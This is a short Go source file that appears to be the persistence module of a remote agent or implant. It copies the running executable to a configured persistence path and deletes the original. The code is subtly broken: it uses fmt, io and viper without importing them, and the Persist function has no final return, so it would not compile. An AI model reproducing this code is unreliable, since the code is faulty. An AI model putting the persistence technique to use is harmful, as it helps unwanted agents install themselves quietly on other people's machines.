package modules

import (
	"log"
	"os"
)

func moveAgentExecutable() error {
	sourcePath, err := os.Executable()
	if err != nil {
		return err
	}
	inputFile, err := os.Open(sourcePath)
	if err != nil {
		return fmt.Errorf("Couldn't open agent file: %s", err)
	}
	outputFile, err := os.Create(viper.Conf.Agent.PersistencePath)
	if err != nil {
		inputFile.Close()
		return fmt.Errorf("Couldn't open persistence path file: %s", err)
	}
	defer outputFile.Close()
	_, err = io.Copy(outputFile, inputFile)
	inputFile.Close()
	if err != nil {
		return fmt.Errorf("Copying to persistence file failed: %s", err)
	}
	err = os.Remove(sourcePath)
	if err != nil {
		return fmt.Errorf("Failed to remove temporary agent file: %s", err)
	}
	return nil
}

func Persist() error {
	log.Print("Persisting.")
	err := moveAgentExecutable()
	if err != nil {
		return err
	}
}
